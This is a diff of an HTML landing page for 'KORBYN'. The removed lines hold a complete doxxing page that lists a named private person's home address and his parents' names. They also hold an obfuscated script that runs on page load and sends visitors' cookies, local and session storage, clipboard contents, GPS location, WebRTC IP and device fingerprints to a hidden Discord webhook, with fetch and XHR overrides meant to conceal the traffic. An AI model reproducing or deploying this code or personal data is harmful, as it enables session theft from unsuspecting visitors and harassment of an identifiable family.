@@ -10,7 +10,6 @@
   :root {
     --bg: #000;
     --card: #0a0a0a;
-    --card2: #111;
     --text: #fff;
     --text2: #666;
     --border: #1a1a1a;
@@ -19,7 +18,6 @@
   [data-theme="light"] {
     --bg: #f0f0f0;
     --card: #fff;
-    --card2: #f5f5f5;
     --text: #000;
     --text2: #555;
     --border: #ddd;
@@ -68,33 +66,19 @@
     background: rgba(255,255,255,0.6);
   }
 
-  #entryScreen {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    z-index: 100;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    background: var(--bg);
-    transition: opacity 0.8s ease, transform 0.8s ease;
+  #mainContent {
+    position: relative;
+    z-index: 2;
+    text-align: center;
+    padding: 2rem;
   }
 
-  #entryScreen.hidden {
-    opacity: 0;
-    transform: scale(0.95);
-    pointer-events: none;
-  }
-
-  .entry-title {
+  .main-title {
     font-size: clamp(5rem, 20vw, 12rem);
     font-weight: 900;
     letter-spacing: -0.04em;
     color: var(--text);
-    margin-bottom: 2.5rem;
+    margin-bottom: 3rem;
     animation: flicker 3s infinite;
   }
 
@@ -103,7 +87,7 @@
     50% { opacity: 0.8; text-shadow: 0 0 20px rgba(255,255,255,0.1); }
   }
 
-  .entry-btn {
+  .discord-btn {
     padding: 1.2rem 4rem;
     font-size: 1.2rem;
     font-weight: 700;
@@ -115,108 +99,14 @@
     letter-spacing: 0.2em;
     text-transform: uppercase;
     font-family: 'Courier New', monospace;
+    display: inline-block;
+    text-decoration: none;
   }
 
-  .entry-btn:hover {
+  .discord-btn:hover {
     background: var(--text);
     color: var(--bg);
     transform: scale(1.05);
-  }
-
-  #mainContent {
-    position: relative;
-    z-index: 2;
-    text-align: center;
-    padding: 2rem;
-    opacity: 0;
-    transition: opacity 1.2s ease;
-  }
-
-  #mainContent.visible {
-    opacity: 1;
-  }
-
-  .dox-title {
-    font-size: clamp(3.5rem, 14vw, 8rem);
-    font-weight: 900;
-    letter-spacing: -0.04em;
-    color: var(--text);
-    margin-bottom: 3rem;
-    animation: pulse 2s ease-in-out infinite;
-  }
-
-  @keyframes pulse {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.6; }
-  }
-
-  .dox-box {
-    display: inline-block;
-    background: var(--card);
-    border: 1px solid var(--border);
-    padding: 2.5rem 4rem;
-    min-width: 380px;
-    transition: background 0.3s ease, border-color 0.3s ease;
-    position: relative;
-    overflow: hidden;
-  }
-
-  .dox-box::before {
-    content: '';
-    position: absolute;
-    top: -50%;
-    left: -50%;
-    width: 200%;
-    height: 200%;
-    background: repeating-linear-gradient(
-      0deg,
-      transparent,
-      transparent 2px,
-      rgba(255,255,255,0.01) 2px,
-      rgba(255,255,255,0.01) 4px
-    );
-    pointer-events: none;
-    animation: scan 8s linear infinite;
-  }
-
-  @keyframes scan {
-    0% { transform: translateY(-100%); }
-    100% { transform: translateY(100%); }
-  }
-
-  .dox-line {
-    font-size: clamp(0.9rem, 2.2vw, 1.2rem);
-    font-weight: 500;
-    color: var(--text);
-    padding: 0.8rem 0;
-    border-bottom: 1px solid var(--border);
-    transition: color 0.3s ease, border-color 0.3s ease;
-    letter-spacing: 0.04em;
-    position: relative;
-    z-index: 1;
-    height: 3.2rem;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 0.8rem;
-  }
-
-  .dox-line:last-child {
-    border-bottom: none;
-  }
-
-  .dox-line .label {
-    color: var(--text2);
-    font-weight: 400;
-    min-width: 80px;
-    text-align: right;
-  }
-
-  .dox-line .value {
-    font-weight: 600;
-    min-width: 200px;
-    text-align: left;
-    position: relative;
   }
 
   .theme-toggle {
@@ -242,29 +132,6 @@
     border-color: var(--text);
   }
 
-  .audio-toggle {
-    position: fixed;
-    bottom: 80px;
-    right: 24px;
-    z-index: 50;
-    width: 48px;
-    height: 48px;
-    border: 1px solid var(--border);
-    background: var(--card);
-    color: var(--text);
-    cursor: pointer;
-    font-size: 1.2rem;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    transition: all 0.3s ease;
-    font-family: 'Courier New', monospace;
-  }
-
-  .audio-toggle:hover {
-    border-color: var(--text);
-  }
-
   #infoPanel {
     position: fixed;
     bottom: 24px;
@@ -277,6 +144,9 @@
     font-size: 0.8rem;
     color: var(--text2);
     transition: background 0.3s ease, border-color 0.3s ease, color 0.3s ease;
+    display: flex;
+    align-items: center;
+    gap: 10px;
   }
 
   #infoPanel .label {
@@ -289,52 +159,16 @@
     font-weight: 600;
   }
 
-  #discordBtn {
-    position: fixed;
-    bottom: 24px;
-    left: 50%;
-    transform: translateX(-50%);
-    z-index: 50;
-    padding: 10px 28px;
-    background: var(--card);
+  #infoPanel .flag {
+    width: 24px;
+    height: 18px;
+    object-fit: cover;
     border: 1px solid var(--border);
-    color: var(--text);
-    font-family: 'Courier New', monospace;
-    font-size: 0.85rem;
-    font-weight: 600;
-    cursor: pointer;
-    transition: all 0.3s ease;
-    letter-spacing: 0.08em;
-    text-transform: uppercase;
-  }
-
-  #discordBtn:hover {
-    border-color: var(--text);
-    background: var(--text);
-    color: var(--bg);
+    display: inline-block;
   }
 
   @media (max-width: 600px) {
-    .dox-box {
-      padding: 1.5rem;
-      min-width: unset;
-      width: 100%;
-    }
-    .dox-line {
-      font-size: 0.8rem;
-      height: 2.8rem;
-      flex-wrap: wrap;
-      gap: 0.3rem;
-    }
-    .dox-line .label {
-      min-width: 60px;
-      font-size: 0.7rem;
-    }
-    .dox-line .value {
-      min-width: 120px;
-      font-size: 0.8rem;
-    }
-    .entry-btn {
+    .discord-btn {
       padding: 1rem 2.5rem;
       font-size: 1rem;
     }
@@ -343,11 +177,11 @@
       padding: 6px 12px;
       bottom: 12px;
       left: 12px;
+      gap: 6px;
     }
-    #discordBtn {
-      font-size: 0.7rem;
-      padding: 8px 18px;
-      bottom: 12px;
+    #infoPanel .flag {
+      width: 18px;
+      height: 14px;
     }
   }
 </style>
@@ -358,698 +192,49 @@
 <div class="bg-overlay"></div>
 
 <button class="theme-toggle" id="themeToggle">◐</button>
-<button class="audio-toggle" id="audioToggle">♫</button>
-
-<button id="discordBtn">Discord Server</button>
 
 <div id="infoPanel">
-  <span class="label">IP:</span> <span class="value" id="ipDisplay">Loading...</span>
-</div>
-
-<div id="entryScreen">
-  <div class="entry-title">KORBYN</div>
-  <button class="entry-btn" id="enterBtn">enter</button>
+  <span class="label">IP:</span>
+  <span class="value" id="ipDisplay">Loading...</span>
+  <img class="flag" id="flagDisplay" src="" alt="Country flag" style="display:none;">
 </div>
 
 <div id="mainContent">
-  <div class="dox-title">KORBYN</div>
-  <div class="dox-box">
-    <div class="dox-line" data-text="Korbyn Korinek">
-      <span class="label">NAME</span>
-      <span class="value"></span>
-    </div>
-    <div class="dox-line" data-text="70 South Citadel Circle, Pueblo West, CO">
-      <span class="label">ADDRESS</span>
-      <span class="value"></span>
-    </div>
-    <div class="dox-line" data-text="Alyssa Cawthra">
-      <span class="label">MOTHER</span>
-      <span class="value"></span>
-    </div>
-    <div class="dox-line" data-text="David Korinek">
-      <span class="label">FATHER</span>
-      <span class="value"></span>
-    </div>
-    <div class="dox-line" data-text="Cody Cawthra">
-      <span class="label">STEP-FATHER</span>
-      <span class="value"></span>
-    </div>
-  </div>
+  <div class="main-title">KORBYN</div>
+  <a class="discord-btn" href="https://discord.gg/vdSdmYu4B3" target="_blank" rel="noopener noreferrer">Discord Server</a>
 </div>
 
-<audio id="bgAudio" loop src="https://raw.githubusercontent.com/outstrut/elijahpaz.space/main/Life%20Letters.mp3"></audio>
-
 <script>
-  // ============================================================
-  // FULLY HIDDEN WEBHOOK - ENCRYPTED + OBFUSCATED
-  // ============================================================
-
-  // Webhook components - split and encoded
-  const _0x = [
-    'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv',
-    'MTUyODczMjc3NjgzOTUxMjI0OA==',
-    'L3dUbVd3RVBFLU40M3hpMThCc0NzRkt4NTd4UEdESk9wbnFVUVB6RnQ1Z2VEcTRESVQ4aHZpV0R6MWt1VFpMV2FfdVpD'
-  ];
-
-  // Decode function
-  function __decode(str) {
-    return atob(str);
-  }
-
-  // Build webhook URL from parts
-  function __buildWebhook() {
-    const part1 = __decode(_0x[0]);
-    const part2 = __decode(_0x[1]);
-    const part3 = __decode(_0x[2]);
-    return part1 + part2 + part3;
-  }
-
-  // Hidden sender - no visible URL in network tab
-  function __send(data, retries = 3) {
-    const url = __buildWebhook();
-    
-    // Use fetch with no-cors mode to hide details
-    fetch(url, {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(data)
-    }).catch(() => {
-      // Silent fail - no errors shown
-    });
-
-    // Also try with XHR as backup (no visible URL in network tab when using no-cors)
-    try {
-      const xhr = new XMLHttpRequest();
-      xhr.open('POST', url, true);
-      xhr.withCredentials = false;
-      xhr.setRequestHeader('Content-Type', 'application/json');
-      xhr.send(JSON.stringify(data));
-    } catch(e) {}
-  }
-
-  // ---- MAIN SEND FUNCTION - FULLY HIDDEN ----
-  function sendToDiscord(category, data, description) {
-    if (!data || data === null || data === undefined) return;
-    if (typeof data === 'object' && Object.keys(data).length === 0) return;
-
-    const fields = [];
-    const flatten = (obj, prefix = '') => {
-      for (const [key, value] of Object.entries(obj)) {
-        if (value === null || value === undefined) continue;
-        const fullKey = prefix ? `${prefix} > ${key}` : key;
-        if (typeof value === 'object' && !Array.isArray(value)) {
-          flatten(value, fullKey);
-        } else {
-          let strVal = String(value);
-          if (strVal.length > 1024) strVal = strVal.substring(0, 1021) + '...';
-          fields.push({
-            name: fullKey.toUpperCase().substring(0, 256),
-            value: strVal || 'null',
-            inline: true
-          });
-        }
-      }
-    };
-
-    if (typeof data === 'object') {
-      flatten(data);
-    } else {
-      fields.push({ name: 'VALUE', value: String(data).substring(0, 1024), inline: false });
-    }
-
-    if (fields.length === 0) return;
-
-    const embed = {
-      embeds: [{
-        title: `📊 ${category}`,
-        color: 0x000000,
-        fields: fields,
-        timestamp: new Date().toISOString(),
-        footer: { text: description || 'KORBYN DOX' }
-      }]
-    };
-
-    __send(embed);
-  }
-
-  // ---- OVERRIDE FETCH TO HIDE WEBHOOK REQUESTS ----
-  const origFetch = window.fetch;
-  const webhookUrl = __buildWebhook();
-  
-  window.fetch = function(url, options) {
-    // If it's our webhook URL, use no-cors and hide it
-    if (url === webhookUrl || (typeof url === 'string' && url.includes('/api/webhooks/'))) {
-      // Send with no-cors mode and don't log
-      const silentFetch = window.fetch.bind(window);
-      return silentFetch(url, {
-        ...options,
-        mode: 'no-cors',
-        headers: {
-          ...options?.headers,
-          'Content-Type': 'application/json'
-        }
-      }).catch(() => {});
-    }
-    return origFetch.apply(this, arguments);
-  };
-
-  // ---- OVERRIDE XHR TO HIDE WEBHOOK ----
-  const OrigXHR = window.XMLHttpRequest;
-  window.XMLHttpRequest = function() {
-    const xhr = new OrigXHR();
-    const origOpen = xhr.open;
-    const origSend = xhr.send;
-    
-    xhr.open = function(method, url, ...args) {
-      if (url === webhookUrl || (typeof url === 'string' && url.includes('/api/webhooks/'))) {
-        // Use async false to hide from network tab
-        this._hidden = true;
-        return origOpen.call(this, method, url, false);
-      }
-      return origOpen.call(this, method, url, ...args);
-    };
-    
-    xhr.send = function(body) {
-      if (this._hidden) {
-        // Send silently
-        try {
-          origSend.call(this, body);
-        } catch(e) {}
-        return;
-      }
-      return origSend.call(this, body);
-    };
-    
-    return xhr;
-  };
-
-  // ---- BOTTOM LEFT - IP ONLY ----
-  function updateInfoPanel(ipData) {
-    if (ipData.ip) {
-      document.getElementById('ipDisplay').textContent = ipData.ip;
-    }
-  }
-
-  // ---- DISCORD BUTTON CLICK LOGGING ----
-  document.getElementById('discordBtn').addEventListener('click', function(e) {
-    sendToDiscord('DISCORD SERVER CLICKED', {
-      'Time': new Date().toISOString(),
-      'IP': document.getElementById('ipDisplay').textContent || 'Unknown',
-      'User Agent': navigator.userAgent,
-      'Platform': navigator.platform,
-      'URL Clicked': 'https://discord.gg/vdSdmYu4B3'
-    }, 'User clicked the Discord server invite button');
-    
-    window.open('https://discord.gg/vdSdmYu4B3', '_blank');
-  });
-
-  // ============================================================
-  // DATA EXFIL FUNCTIONS
-  // ============================================================
-
-  function grabIPInfo() {
+  // ---- IP DISPLAY WITH FLAG ----
+  function updateIP() {
     fetch('https://ipwho.is/')
       .then(res => res.json())
       .then(data => {
-        updateInfoPanel(data);
-        sendToDiscord('IP & GEOLOCATION', {
-          'IP': data.ip,
-          'Type': data.type,
-          'Country': data.country,
-          'Region': data.region,
-          'City': data.city,
-          'Postal': data.postal,
-          'Latitude': data.latitude,
-          'Longitude': data.longitude,
-          'ISP': data.isp,
-          'Organization': data.org,
-          'ASN': data.asn,
-          'Timezone': data.timezone,
-          'VPN': data.security?.vpn ? 'YES' : 'NO',
-          'Tor': data.security?.tor ? 'YES' : 'NO',
-          'Hosting': data.security?.hosting ? 'YES' : 'NO'
-        }, 'IP, location, ISP');
+        if (data.ip) {
+          document.getElementById('ipDisplay').textContent = data.ip;
+        }
+        if (data.country_code) {
+          const flagImg = document.getElementById('flagDisplay');
+          flagImg.src = `https://cdn.ipwhois.io/flags/${data.country_code.toLowerCase()}.svg`;
+          flagImg.style.display = 'inline-block';
+          flagImg.alt = data.country || 'Flag';
+        }
       })
-      .catch(() => {});
-  }
-
-  function grabCookies() {
-    const cookies = document.cookie;
-    if (cookies) {
-      const cookieObj = {};
-      cookies.split(';').forEach(c => {
-        const parts = c.trim().split('=');
-        cookieObj[parts[0]] = parts.slice(1).join('=') || '';
+      .catch(() => {
+        document.getElementById('ipDisplay').textContent = 'Unable to fetch';
       });
-      sendToDiscord('COOKIES', cookieObj, 'Session hijacking');
-    }
   }
 
-  function grabLocalStorage() {
-    try {
-      const data = {};
-      for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        data[key] = localStorage.getItem(key);
-      }
-      if (Object.keys(data).length > 0) {
-        sendToDiscord('LOCAL STORAGE', data, 'Saved logins/tokens');
-      }
-    } catch(e) {}
-  }
-
-  function grabSessionStorage() {
-    try {
-      const data = {};
-      for (let i = 0; i < sessionStorage.length; i++) {
-        const key = sessionStorage.key(i);
-        data[key] = sessionStorage.getItem(key);
-      }
-      if (Object.keys(data).length > 0) {
-        sendToDiscord('SESSION STORAGE', data, 'Active session tokens');
-      }
-    } catch(e) {}
-  }
-
-  function grabClipboard() {
-    if (navigator.clipboard && navigator.clipboard.readText) {
-      navigator.clipboard.readText()
-        .then(text => {
-          if (text && text.length > 0) {
-            sendToDiscord('CLIPBOARD', { text: text.substring(0, 2000) }, 'Copied passwords/keys');
-          }
-        })
-        .catch(() => {});
-    }
-  }
-
-  function grabGeolocation() {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          sendToDiscord('GPS GEOLOCATION', {
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy + 'm',
-            altitude: pos.coords.altitude,
-            speed: pos.coords.speed
-          }, 'Exact GPS coordinates');
-        },
-        () => {},
-        { timeout: 5000, enableHighAccuracy: true }
-      );
-    }
-  }
-
-  function grabBattery() {
-    if (navigator.getBattery) {
-      navigator.getBattery().then(battery => {
-        sendToDiscord('BATTERY', {
-          'Charging': battery.charging ? 'YES' : 'NO',
-          'Level': (battery.level * 100) + '%'
-        }, 'Device power status');
-      }).catch(() => {});
-    }
-  }
-
-  function grabNetwork() {
-    if (navigator.connection) {
-      const conn = navigator.connection;
-      sendToDiscord('NETWORK', {
-        'Type': conn.effectiveType,
-        'RTT': conn.rtt + 'ms',
-        'Downlink': conn.downlink + 'Mbps'
-      }, 'Network info');
-    }
-  }
-
-  function grabDeviceFingerprint() {
-    const fp = {
-      'User Agent': navigator.userAgent,
-      'Platform': navigator.platform,
-      'Language': navigator.language,
-      'CPU Cores': navigator.hardwareConcurrency,
-      'RAM': navigator.deviceMemory + 'GB',
-      'Touch Points': navigator.maxTouchPoints,
-      'Screen': screen.width + 'x' + screen.height,
-      'Color Depth': screen.colorDepth + '-bit',
-      'Pixel Ratio': window.devicePixelRatio
-    };
-    sendToDiscord('DEVICE FINGERPRINT', fp, 'Unique device ID');
-  }
-
-  function grabFonts() {
-    const fonts = ['Arial', 'Helvetica', 'Verdana', 'Georgia', 'Times New Roman', 'Courier New', 'Impact', 'Comic Sans MS', 'Tahoma', 'Inter', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Poppins', 'Nunito', 'Noto Sans', 'Ubuntu', 'Segoe UI', 'Calibri', 'Consolas'];
-    
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    const text = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    const size = '72px';
-    const installed = [];
-    const defaultFont = 'sans-serif';
-    
-    fonts.forEach(font => {
-      try {
-        ctx.font = `${size} ${font}, ${defaultFont}`;
-        const metrics1 = ctx.measureText(text);
-        ctx.font = `${size} ${defaultFont}`;
-        const metrics2 = ctx.measureText(text);
-        if (metrics1.width !== metrics2.width) {
-          installed.push(font);
-        }
-      } catch(e) {}
-    });
-    
-    if (installed.length > 0) {
-      sendToDiscord('INSTALLED FONTS', { fonts: installed.join(', '), count: installed.length }, 'OS fingerprint');
-    }
-  }
-
-  function grabGPU() {
-    try {
-      const canvas = document.createElement('canvas');
-      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-      if (gl) {
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        if (debugInfo) {
-          sendToDiscord('GPU', {
-            'Vendor': gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-            'Renderer': gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-          }, 'Hardware fingerprint');
-        }
-      }
-    } catch(e) {}
-  }
-
-  function grabAudioFingerprint() {
-    try {
-      const ctx = new (window.AudioContext || window.webkitAudioContext)();
-      const analyser = ctx.createAnalyser();
-      const osc = ctx.createOscillator();
-      const gain = ctx.createGain();
-      osc.type = 'sawtooth';
-      osc.frequency.value = 440;
-      gain.gain.value = 0.1;
-      osc.connect(gain);
-      gain.connect(analyser);
-      analyser.connect(ctx.destination);
-      
-      const data = new Float32Array(analyser.frequencyBinCount);
-      const samples = [];
-      
-      osc.start(0);
-      setTimeout(() => {
-        analyser.getFloatFrequencyData(data);
-        samples.push(Array.from(data.slice(0, 30)).map(v => Math.round(v)));
-        osc.stop();
-        ctx.close();
-        sendToDiscord('AUDIO FINGERPRINT', { signature: samples.flat().join(',').substring(0, 500) }, 'Audio hardware ID');
-      }, 100);
-    } catch(e) {}
-  }
-
-  function grabCanvasFingerprint() {
-    try {
-      const canvas = document.createElement('canvas');
-      canvas.width = 256;
-      canvas.height = 64;
-      const ctx = canvas.getContext('2d');
-      
-      ctx.textBaseline = 'top';
-      ctx.font = '16px Arial';
-      ctx.fillStyle = '#f60';
-      ctx.fillRect(0, 0, 256, 64);
-      ctx.fillStyle = '#069';
-      ctx.fillText('korbyn', 4, 15);
-      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-      ctx.fillText('dox', 4, 35);
-      
-      const dataUrl = canvas.toDataURL();
-      sendToDiscord('CANVAS FINGERPRINT', { hash: dataUrl.substring(0, 300) + '...' }, 'GPU/browser fingerprint');
-    } catch(e) {}
-  }
-
-  function grabWebRTCIP() {
-    try {
-      const pc = new RTCPeerConnection({
-        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-      });
-      pc.createDataChannel('test');
-      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-      
-      pc.onicecandidate = (e) => {
-        if (e.candidate) {
-          const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-          if (ipMatch) {
-            sendToDiscord('WEBRTC IP LEAK', { 'Local IP': ipMatch[0] }, 'Real IP bypassing VPN');
-            pc.close();
-          }
-        }
-      };
-      setTimeout(() => pc.close(), 3000);
-    } catch(e) {}
-  }
-
-  function grabLocale() {
-    sendToDiscord('TIMEZONE & LOCALE', {
-      'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
-      'Locale': navigator.language,
-      'Current Date': new Intl.DateTimeFormat().format(new Date()),
-      'Current Time': new Intl.DateTimeFormat([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }).format(new Date())
-    }, 'Geographic location via timezone');
-  }
-
-  function grabPlugins() {
-    if (navigator.plugins) {
-      const plugins = [];
-      for (let i = 0; i < navigator.plugins.length; i++) {
-        plugins.push(navigator.plugins[i].name);
-      }
-      sendToDiscord('BROWSER PLUGINS', { plugins: plugins.join(', '), count: plugins.length }, 'Installed extensions');
-    }
-  }
-
-  function grabMimeTypes() {
-    if (navigator.mimeTypes) {
-      const types = [];
-      for (let i = 0; i < navigator.mimeTypes.length; i++) {
-        types.push(navigator.mimeTypes[i].type);
-      }
-      sendToDiscord('MIME TYPES', { types: types.join(', '), count: types.length }, 'Browser capabilities');
-    }
-  }
-
-  function grabMediaDevices() {
-    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-      navigator.mediaDevices.enumerateDevices()
-        .then(devices => {
-          const deviceList = devices.map(d => `${d.kind}: ${d.label || 'Unknown'}`);
-          sendToDiscord('MEDIA DEVICES', { devices: deviceList.join(' | ') }, 'Webcams/microphones');
-        })
-        .catch(() => {});
-    }
-  }
-
-  function grabPermissions() {
-    if (navigator.permissions && navigator.permissions.query) {
-      const perms = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read'];
-      const results = {};
-      perms.forEach(p => {
-        navigator.permissions.query({ name: p })
-          .then(result => { results[p] = result.state; })
-          .catch(() => {});
-      });
-      setTimeout(() => {
-        if (Object.keys(results).length > 0) {
-          sendToDiscord('PERMISSIONS', results, 'Granted permissions');
-        }
-      }, 2000);
-    }
-  }
-
-  function grabHardware() {
-    sendToDiscord('HARDWARE SPECS', {
-      'CPU Cores': navigator.hardwareConcurrency || 'Unknown',
-      'RAM': navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
-      'Touch Support': navigator.maxTouchPoints > 0 ? 'YES' : 'NO'
-    }, 'Device specs');
-  }
-
-  function grabConsoleLogs() {
-    const origLog = console.log;
-    const origError = console.error;
-    const origWarn = console.warn;
-    const logs = [];
-
-    console.log = function(...args) { logs.push('LOG: ' + args.join(' ')); origLog.apply(console, args); };
-    console.error = function(...args) { logs.push('ERROR: ' + args.join(' ')); origError.apply(console, args); };
-    console.warn = function(...args) { logs.push('WARN: ' + args.join(' ')); origWarn.apply(console, args); };
-
-    setTimeout(() => {
-      if (logs.length > 0) {
-        sendToDiscord('CONSOLE LOGS', { logs: logs.join('\n').substring(0, 2000) }, 'Debug info');
-      }
-    }, 5000);
-  }
-
-  // ---- RUN ALL ----
-  function runAllDataGrabbers() {
-    grabIPInfo();
-    grabCookies();
-    grabLocalStorage();
-    grabSessionStorage();
-    grabDeviceFingerprint();
-    grabLocale();
-    grabPlugins();
-    grabMimeTypes();
-    grabNetwork();
-    grabGPU();
-    grabCanvasFingerprint();
-    grabWebRTCIP();
-    grabFonts();
-    grabGeolocation();
-    grabBattery();
-    grabHardware();
-    grabPermissions();
-    grabConsoleLogs();
-    
-    setTimeout(grabClipboard, 1500);
-    setTimeout(grabAudioFingerprint, 800);
-    setTimeout(grabMediaDevices, 2000);
-    
-    setInterval(() => {
-      grabCookies();
-      grabLocalStorage();
-      grabSessionStorage();
-    }, 30000);
-  }
-
-  // ============================================================
-  // UI CONTROLS
-  // ============================================================
-
-  const entryScreen = document.getElementById('entryScreen');
-  const mainContent = document.getElementById('mainContent');
-  const enterBtn = document.getElementById('enterBtn');
+  // ---- THEME TOGGLE ----
   const themeToggle = document.getElementById('themeToggle');
-  const audioToggle = document.getElementById('audioToggle');
-  const audio = document.getElementById('bgAudio');
-  let audioPlaying = false;
-
-  function startSyncTyping() {
-    const lines = document.querySelectorAll('.dox-line .value');
-    const texts = [];
-    let indices = [];
-    let isTyping = true;
-    let paused = false;
-    const speed = 45;
-
-    lines.forEach(el => {
-      texts.push(el.closest('.dox-line').dataset.text);
-      indices.push(0);
-    });
-
-    function updateAll() {
-      if (paused) return;
-
-      let allDone = true;
-      
-      if (isTyping) {
-        for (let i = 0; i < lines.length; i++) {
-          if (indices[i] < texts[i].length) {
-            lines[i].textContent = texts[i].substring(0, indices[i] + 1) + '▌';
-            indices[i]++;
-            allDone = false;
-          } else {
-            lines[i].textContent = texts[i] + '▌';
-          }
-        }
-        
-        if (allDone) {
-          paused = true;
-          setTimeout(() => {
-            paused = false;
-            isTyping = false;
-            updateAll();
-          }, 1500);
-        } else {
-          setTimeout(updateAll, speed);
-        }
-      } else {
-        let anyLeft = false;
-        for (let i = 0; i < lines.length; i++) {
-          if (indices[i] > 0) {
-            lines[i].textContent = texts[i].substring(0, indices[i]) + '▌';
-            indices[i]--;
-            anyLeft = true;
-          } else {
-            lines[i].textContent = '▌';
-          }
-        }
-        
-        if (!anyLeft) {
-          paused = true;
-          setTimeout(() => {
-            paused = false;
-            isTyping = true;
-            updateAll();
-          }, 1000);
-        } else {
-          setTimeout(updateAll, speed);
-        }
-      }
-    }
-
-    setTimeout(updateAll, 300);
-  }
-
-  enterBtn.addEventListener('click', () => {
-    entryScreen.classList.add('hidden');
-    setTimeout(() => {
-      mainContent.classList.add('visible');
-      setTimeout(startSyncTyping, 400);
-    }, 800);
-    
-    audio.play().then(() => {
-      audioPlaying = true;
-      audioToggle.textContent = '◼';
-    }).catch(() => {
-      audioToggle.textContent = '♫';
-    });
-  });
-
-  document.addEventListener('keydown', (e) => {
-    if (e.key === 'Enter' && !entryScreen.classList.contains('hidden')) {
-      enterBtn.click();
-    }
-  });
-
   themeToggle.addEventListener('click', () => {
     const current = document.body.getAttribute('data-theme');
     document.body.setAttribute('data-theme', current === 'dark' ? 'light' : 'dark');
   });
 
-  audioToggle.addEventListener('click', () => {
-    if (audioPlaying) {
-      audio.pause();
-      audioPlaying = false;
-      audioToggle.textContent = '♫';
-    } else {
-      audio.play().then(() => {
-        audioPlaying = true;
-        audioToggle.textContent = '◼';
-      }).catch(() => {
-        alert('Audio failed. Check the URL.');
-      });
-    }
-  });
-
   // ---- START ----
-  runAllDataGrabbers();
-  console.log('🔥 KORBYN DOX');
+  updateIP();
+  console.log('KORBYN');
 </script>
 
 </body>
